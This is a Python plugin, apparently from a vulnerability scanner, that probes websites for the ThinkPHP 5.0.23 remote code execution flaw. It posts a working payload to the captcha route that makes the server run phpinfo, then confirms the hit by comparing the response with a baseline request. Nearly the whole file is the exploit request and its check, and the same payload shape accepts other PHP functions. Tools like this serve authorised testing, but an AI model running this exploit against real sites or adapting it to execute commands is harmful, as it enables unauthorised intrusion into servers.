"""  
@Time: 2024/2/28 16:53 
@Auth: Y5neKO
@File: Thinkphp5023_rce.py 
@IDE: PyCharm 
"""
import requests
import re
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'Thinkphp5023_rce',
        'vulnerable': False,
        'attack': True,
    }
    try:
        target = url + '/index.php?s=captcha'
        payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        response = requests.post(target, data=payload, timeout=timeout, verify=False, headers=headers)
        response2 = requests.post(target, timeout=timeout, verify=False, headers=headers)
        if re.search(r'PHP Version', response.text) and not re.search(r'PHP Version', response2.text):
            result['vulnerable'] = True
            result['method'] = 'POST'
            result['url'] = target
            result['position'] = 'data'
            result['payload'] = payload
            result['attack'] = True
        return result
    except Exception as e:
        print(e)
        return result
